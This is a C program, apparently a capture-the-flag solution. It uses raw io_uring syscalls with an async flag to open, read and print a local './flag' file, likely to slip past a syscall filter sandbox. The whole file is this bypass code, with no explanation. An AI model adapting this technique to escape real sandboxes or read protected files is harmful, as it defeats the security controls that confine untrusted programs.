#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <err.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "linux/io_uring.h"

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

int main(void)
{
  // initialize uring
  struct io_uring_params params = {};
  int opened_fd;
  char buffer[100];
  int uring_fd = syscall(SYS_io_uring_setup, 16, &params);
  unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);
  unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);
  struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_OPENAT,
      .flags = IOSQE_ASYNC,
      .fd = AT_FDCWD,
      .addr = "./flag",
      .open_flags = O_RDONLY,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
  struct io_uring_cqe *cqe = (void *)(cq_ring + params.cq_off.cqes);
  opened_fd = (int)cqe->res;

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_READ,
      .fd = opened_fd,
      .addr = buffer,
      .len = 100,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_WRITE,
      .fd = 1,
      .addr = buffer,
      .len = 100,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 3, IORING_ENTER_GETEVENTS, NULL, 0);
  return 0;
}
